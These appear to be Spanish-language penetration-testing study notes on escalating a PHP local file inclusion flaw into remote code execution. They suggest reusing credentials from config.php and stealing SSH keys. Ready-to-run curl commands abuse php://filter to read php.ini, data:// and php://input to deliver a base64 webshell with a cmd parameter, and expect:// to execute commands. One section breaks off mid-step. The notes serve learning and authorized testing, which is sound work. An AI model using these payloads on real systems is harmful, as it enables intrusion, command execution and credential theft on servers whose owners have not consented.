Un metodo facil es enumerando las credenciales de usuario y las claves SSH para usarlas para iniciar sesion en el servidor backend

Por ejemplo podemos conseguir credenciales en el archivo config.php (que podria contener credenciales de usuarios que se podrian reutilizar) o revisar el directorio de usuario para ver las claves .ssh y usaralas

Hay otros metodos que nos permiten ejecutar comandos directamente a traves de la vulnerabilidad LFI. Para ello usaremos PHP Wrappers 


## PHP Wrapper Data

Se puede usar para incluir datos externos, incluido codigo

Solo disponible si la configuracion `allow_url_include` esta habilitada en las configuraciones de PHP y no lo esta por defecto (aunque suele estar activada para funcionar correctamente con ciertos plugins)

1. Verificamos si `allow_url_include` esta habilitado en las configuraciones PHP mirando archivos de configuracion

	- Apache: /etc/php/X.Y/apache2/php.ini
	- Nginx: /etc/php/X.Y/fpm/php.ini

X.Y es la version PHP instalada


Usaremos los filtros de convert.base64-encode para obtener el archivo de configuracion

```
curl "http://IP:PORT/index.php?PARAMETRO=php://filter/read=convert.base64-encode/resource=../../../etc/php/7.4/apache2/php.ini"
```
![[Pasted image 20260718124555.png]]

Lo decodificamos:

```
echo 'BASE64' | base64 -d | grep allow_url_include
```
![[Pasted image 20260718124626.png]]


2. Ejecucion remota de codigo usando el PHP Wrapper Data (este nos permite incluir datos externos)

Le pasaremos una cadena codificada en BASE64 con un webshell

![[Pasted image 20260718124903.png]]

Se lo pasamos usando data y ejecutamos comandos:

```
http://IP:PORT/index.php?PARAMETRO=data://text/plain;base64,BASE64&cmd=COMANDO
```

![[Pasted image 20260718125049.png]]

O con curl:

```
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,BASE64&cmd=COMANDO
```
![[Pasted image 20260718125157.png]]


## PHP Wrapper Input

Es parecido a data y se usa para incluir entradas externas y ejecutar codigo PHP pero en este caso pasamos los datos a traves de una solicitud POST

Este tambien depende de que `allow_url_include` este activado

1. Verificamos que `allow_url_input` este activado:

```
curl "http://IP:PORT/index.php?PARAMETRO=php://filter/read=convert.base64-encode/resource=../../../etc/php/7.4/apache2/php.ini"
```
![[Pasted image 20260718124555.png]]

Lo decodificamos:

```
echo 'BASE64' | base64 -d | grep allow_url_include
```
![[Pasted image 20260718124626.png]]


2. Enviamos una solicitud POST con la webshell usando Input

Si la pagina web tambien nos deja realizart solicitudes GET (usa \$_REQUEST) entonces ponemos el comando de la siguiente forma

```
curl -s -X POST --data 'WEBSHELL' "http://IP:PORT/index.php?PARAMETRO=php://input&cmd=COMANDO"
```
![[Pasted image 20260718125757.png]]


Si solo acepta solicitudes POST lo enviamos dentro de la webshell:

## PHP Wrapper Expect

Nos permite ejecutar comandos directamente a traves de flujos de URL. Funciona de forma muy similar a las webshells de antes

Tiene que estar la funcion `extension=expect` habilitada:

```
curl "http://IP:PORT/index.php?PARAMETRO=php://filter/read=convert.base64-encode/resource=../../../etc/php/7.4/apache2/php.ini"
```
![[Pasted image 20260718124555.png]]

Lo decodificamos:

```
echo 'BASE64' | base64 -d | grep expect
```
![[Pasted image 20260718130139.png]]

Esto no siginifica que vaya a funcionar porque puede fallar por muchos motivos

2. Realizamos la ejucion de comandos usando `expect://`

```
curl -s "http://IP:PORT/index.php?PARAMETRO=expect://COMANDO"
```

![[Pasted image 20260718130304.png]]
